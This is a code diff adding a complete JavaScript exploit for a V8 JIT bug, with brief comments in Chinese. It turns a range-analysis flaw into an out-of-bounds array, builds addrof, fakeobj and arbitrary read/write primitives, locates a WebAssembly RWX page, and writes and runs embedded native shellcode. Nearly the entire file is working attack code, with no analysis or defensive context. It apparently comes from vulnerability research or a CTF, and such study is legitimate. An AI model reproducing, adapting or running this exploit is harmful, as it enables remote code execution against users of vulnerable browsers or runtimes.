@@ -1,0 +1,153 @@
+var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
+var wasm_mod = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_mod);
+var wasm_function = wasm_instance.exports.main;
+var shellcode = [3833809148,12642544,1363214336,1364348993,3526445142,1384859749,1384859744,1384859672,1921730592,3071232080,827148874,3224455369,2086747308,1092627458,1091422657,3991060737,1213284690,2334151307,21511234,2290125776,1207959552,1735704709,1355809096,1142442123,1226850443,1457770497,1103757128,1216885899,827184641,3224455369,3384885676,3238084877,4051034168,608961356,3510191368,1146673269,1227112587,1097256961,1145572491,1226588299,2336346113,21530628,1096303056,1515806296,1497454657,2202556993,1379999980,1096343807,2336774745,4283951378,1214119935,442,0,2374846464,257,2335291969,3590293359,2729832635,2797224278,4288527765,3296938197,2080783400,3774578698,1203438965,1785688595,2302761216,1674969050,778267745,6649957];
+ 
+let arb_write_buffer = new ArrayBuffer(0x300);
+ 
+// 用来实现类型转换
+class Helpers {
+constructor() {
+this.buf =new ArrayBuffer(16);
+this.uint32 = new Uint32Array(this.buf);
+this.float64 = new Float64Array(this.buf);
+this.big_uint64 = new BigUint64Array(this.buf);
+}
+ 
+// float-->uint
+f2i(f)
+{
+this.float64[0] = f;
+return this.big_uint64[0];
+}
+// uint-->float
+i2f(i)
+{
+this.big_uint64[0] = i;
+return this.float64[0];
+}
+// 64-->32
+f2half(val)
+{
+this.float64[0]= val;
+let tmp = Array.from(this.uint32);
+return tmp;
+}
+// 32-->64
+half2f(val)
+{
+this.uint32.set(val);
+return this.float64[0];
+}
+ 
+hex(a) {
+return "0x" + a.toString(16);
+}
+ 
+gc() { for(let i = 0; i < 100; i++) { new ArrayBuffer(0x1000000); } }
+}
+ 
+function foo(flag) {
+// 触发漏洞，使得len==1且Range为(-4294967295, 0)
+let x = -1;
+if (flag) x = 0xFFFF_FFFF;
+let len = 0 - Math.max(0, x);
+// 利用array.shift()来构造出长度为-1(0xFFFFFFFE)的数组
+let vuln_array = new Array(len);
+vuln_array.shift();
+ 
+let oob_array = [1.1, 1.2, 1.3];
+ 
+if (flag) {
+//%DebugPrint(oob_array);
+//%SystemBreak();
+}
+return [vuln_array, oob_array];
+}
+ 
+function confusion_to_oob() {
+console.log("[+] convert confusion to oob......");
+// 触发JIT
+for (let i=0; i<0x10000; i++) {foo(false);}   
+// gc
+helper.gc();
+// 修改oob_array的length
+[vuln_array, oob_array] = foo(true);
+vuln_array[16] = 0xc00c;
+ 
+console.log("    oob_array.length: " + helper.hex(oob_array.length));
+}
+ 
+function addrof(obj) {
+vuln_array[7] = obj;
+ 
+return helper.f2i(oob_array[0]) & 0xFFFF_FFFFn;
+}
+ 
+function fakeobj(addr) {
+oob_array[0] = helper.i2f(addr);
+ 
+return vuln_array[7];
+}
+ 
+function get_arw() {
+console.log("[+] get absolute read/write access......");
+ 
+let oob_array_map_and_properties = helper.f2i(oob_array[3]);
+point_array = [helper.i2f(oob_array_map_and_properties), 1.1, 1.2, 1.3];
+fake = fakeobj(addrof(point_array) - 0x20n);
+}
+ 
+function arb_read(addr) {
+if (addr %2n == 0) {
+addr += 1n;
+}
+// 2n << 32n是为了填充length字段，在指针压缩下length的值会被改为0x1；
+// -8n是因为elements字段指向的内容会自动+8来跳过map和length
+point_array[1] = helper.i2f((2n << 32n) + addr -8n);
+return fake[0];
+}
+ 
+function arb_write(addr, val) {
+if (addr %2n == 0) {
+addr += 1n;
+}
+// 2n << 32n是为了填充length字段，在指针压缩下length的值会被改为0x1；
+// -8n是因为elements字段指向的内容会自动+8来跳过map和length
+point_array[1] = helper.i2f((2n << 32n) + addr -8n);
+fake[0] = helper.i2f(BigInt(val));
+}
+ 
+function get_wasm_rwx() {
+console.log("[+] get address of rwx page......");
+rwx_page_addr = helper.f2i(arb_read(addrof(wasm_instance) + 0x68n));
+//%DebugPrint(wasm_instance);
+//%DebugPrint(wasm_function);
+console.log("    Address of rwx page: " + helper.hex(rwx_page_addr));
+//%SystemBreak();
+}
+ 
+function run_shellcode(addr, shellcode) {
+console.log("[+] run shellcode......");
+let dataview = new DataView(arb_write_buffer);
+let buf_addr = addrof(arb_write_buffer);
+let backing_store_addr = buf_addr + 0x14n;
+arb_write(backing_store_addr, addr);
+for (let i = 0; i < shellcode.length; i++) {
+dataview.setUint32(4*i, shellcode[i], true);
+}
+console.log("[+] success!!!");
+}
+ 
+function exp() {
+helper = new Helpers();
+ 
+confusion_to_oob();
+get_arw();
+get_wasm_rwx();
+run_shellcode(rwx_page_addr, shellcode);
+wasm_function();
+}
+ 
+exp();
